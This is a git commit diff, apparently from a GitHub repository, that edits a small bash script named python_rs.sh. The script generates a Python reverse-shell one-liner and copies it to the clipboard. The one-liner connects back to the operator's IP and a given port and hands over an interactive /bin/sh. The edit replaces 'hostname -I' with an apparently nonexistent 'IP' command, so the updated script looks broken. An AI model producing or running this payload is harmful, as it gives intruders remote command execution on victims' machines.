3614497b0648e8472a598b4b640dfe60fe254991
neogeo56 <54796086+neogeo56@users.noreply.github.com>
2019-12-10 10:24:35 -0600

    Update python_rs.sh

--- Shells/python_rs.sh
+++ Shells/python_rs.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-IP=$( hostname -I );
+IP=$( IP );
 New_IP=$( echo -n $IP );
 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$New_IP\",$1));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$New_IP\",$1));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | clip;
